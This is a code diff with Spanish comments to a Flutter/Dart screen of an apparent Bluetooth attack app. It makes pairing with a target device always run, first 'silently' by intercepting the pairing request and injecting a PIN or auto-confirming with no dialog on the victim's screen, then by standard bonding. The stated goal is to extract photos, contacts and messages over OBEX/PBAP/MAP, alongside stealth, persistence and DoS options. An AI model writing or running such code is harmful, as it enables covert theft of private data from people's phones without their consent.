@@ -522,9 +522,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   // (SweynTooth/Blur/jams/DoS) y acciones intrusivas sin valor de datos,
   // para maximizar la obtención de fotos e información.
   bool _extractionFocus = true;
-  // Bonding automático: DESACTIVADO por defecto. El objetivo puede no estar emparejado
-  // y el diálogo de pareo delata la auditoría en su pantalla.
-  bool _autoBonding = false;
+  // Bonding/emparejamiento: SIEMPRE se intenta al inicio para poder extraer.
+  // Primero silencioso (intercepta el diálogo si el objetivo lo permite);
+  // si el objetivo exige confirmación visible, el bonding estándar mostrará
+  // el diálogo en su pantalla (única vía real para OBEX/PBAP/SPP/MAP).
+  bool _autoBonding = true;
   Map<String, dynamic> _advancedAttackResult = {};
 
   // Adaptive strategy selection
@@ -2837,7 +2839,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     _appendLog('   • Análisis de red: ${_enableNetworkAnalysis ? "ON" : "OFF"}');
     _appendLog('   • Modo sigiloso: ${_stealthMode ? "ON" : "OFF"}');
     _appendLog('   • Persistencia: ${_enablePersistence ? "ON" : "OFF"}');
-    _appendLog('   • Bonding automático: ${_autoBonding ? "ON" : "OFF (objetivo no emparejado)"}');
+    _appendLog('   • Emparejamiento: ${_autoBonding ? "siempre (silencioso → estándar)" : "siempre (intenta parear para extraer)"}');
     _appendLog('   • MODO EXTRACCIÓN: ${_extractionFocus ? "ON — solo vectores que obtienen fotos/info" : "OFF — secuencia completa"}');
     _appendLog('⏱️ Duración estimada: ~5 min');
     _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
@@ -2870,13 +2872,14 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
           _attackDiagnostics.clear();
         });
 
-        // === FASE -2: EMPAREJAMIENTO (BONDING) — OPCIONAL ===
-        // Por defecto DESACTIVADO: se asume que el objetivo NO está emparejado y que
-        // un diálogo de pareo en su pantalla delataría la auditoría. Las técnicas que
-        // funcionan sin bonding (SDP, BLE scan/GATT abierto, L2CAP con root, OBEX legacy)
-        // se ejecutan igualmente; si la extracción falla por falta de pareo, el
-        // DIAGNÓSTICO lo indicará y podrás activar el toggle en el menú ⋮.
-        if (_autoBonding) {
+        // === FASE -2: EMPAREJAMIENTO (BONDING) — SIEMPRE SE INTENTA ===
+        // Prioridad 1: emparejamiento SILENCIOSO (intercepta ACTION_PAIRING_REQUEST
+        // antes que el sistema: inyecta PIN legacy / auto-confirma JustWorks sin
+        // mostrar diálogo en el objetivo). Prioridad 2 (si el objetivo exige
+        // confirmación visible o el silencioso no basta): bonding estándar, que
+        // SÍ mostrará el diálogo de pareo en la pantalla del objetivo.
+        // Sin bonding, OBEX/PBAP/SPP/MAP no pueden extraer datos; por eso se
+        // intenta SIEMPRE al inicio, para maximizar la obtención de info/fotos.
           try {
             _appendLog('🤫 [FASE -2] Intentando EMPAREJAMIENTO SILENCIOSO...');
             final sp = await RealExploitService.silentBonded(address);
@@ -2889,19 +2892,18 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
               _saveState();
             } else {
               _appendLog('   ⚠️ Silencioso falló ($method): $msg');
-              // Fallback honesto: pareo normal SOLO si el usuario activó el toggle
-              _appendLog('   🤝 Reintentando con bonding estándar (puede mostrar diálogo en el objetivo)...');
+              // Si el objetivo exige confirmación visible (smartphone moderno),
+              // se pasa al bonding estándar. El diálogo aparecerá en SU pantalla:
+              // es la única vía real para que OBEX/PBAP/SPP dejen extraer.
+              _appendLog('   🤝 Intentando bonding estándar (puede mostrar diálogo en el objetivo — acéptalo allí si quieres extraer)...');
               final bonded = await RealExploitService.ensureBonded(address);
               _appendLog(bonded
                   ? '   ✅ Objetivo emparejado vía bonding estándar'
-                  : '   ❌ Bonding no completado');
+                  : '   ❌ Bonding no completado (sin aceptación en el objetivo, la extracción emparejada no podrá hacerse)');
             }
           } catch (e) {
             _appendLog('   ⚠️ Emparejamiento no disponible: $e');
           }
-        } else {
-          _appendLog('🤵 [FASE -2] Bonding automático OFF — objetivo tratado como NO emparejado');
-        }
 
         // === FASE -1: RECONOCIMIENTO PROACTIVO ===
         if (_proactiveRecon) {
